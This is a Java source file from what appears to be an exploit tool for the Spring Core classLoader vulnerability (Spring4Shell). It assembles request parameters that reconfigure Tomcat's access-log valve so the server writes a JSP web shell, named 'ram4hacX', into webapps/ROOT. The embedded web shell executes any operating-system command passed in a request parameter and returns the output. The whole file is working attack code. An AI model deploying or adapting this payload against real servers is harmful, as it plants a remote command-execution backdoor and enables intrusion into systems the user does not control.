package main;

import java.util.ArrayList;
import java.util.List;

public class Payload {
    private String vulnUrl;
    private List<String> payload_header_list = null;

    String payload1_jspWebShell;
    String payload1_webShell_header;
    String payload1_webShell_suffix;
    String payload1_webShell_path;
    String payload1_webShell_name;
    String payload1_webShell_flag;

    // Todo 重载 or 配置文件
    public void setPayload1(){
        // payload1
        payload1_jspWebShell = "<% char[] c = {'c'};String cmd = new String(c); java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(cmd)).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1){out.println(new String(b));}  %>";
        payload1_webShell_header = "ram4hacX";
        payload1_webShell_suffix = ".jsp";
        payload1_webShell_path = "webapps/ROOT";
        payload1_webShell_name = "ram4hacX";
        payload1_webShell_flag = "SpringCore";

        payload_header_list = new ArrayList<>();
        payload_header_list.add(payload1_webShell_header +": "+ payload1_jspWebShell);

        String payload1 = "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7b"+ payload1_webShell_header +"%7di%20"+ payload1_webShell_flag;
        String payload2 = "class.module.classLoader.resources.context.parent.pipeline.first.suffix="+ payload1_webShell_suffix;
        String payload3 = "class.module.classLoader.resources.context.parent.pipeline.first.directory="+ payload1_webShell_path;
        String payload4 = "class.module.classLoader.resources.context.parent.pipeline.first.prefix="+ payload1_webShell_name;
        String payload5 = "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=";

        vulnUrl = payload1+"&"+payload2+"&"+payload3+"&"+payload4+"&"+payload5;
    }


    public String getVulnUrl() {
        return vulnUrl;
    }

    public void setVulnUrl(String vulnUrl) {
        this.vulnUrl = vulnUrl;
    }

    public List<String> getPayload_header_list() {
        return payload_header_list;
    }

    public void setPayload_header_list(List<String> payload_header_list) {
        this.payload_header_list = payload_header_list;
    }
}
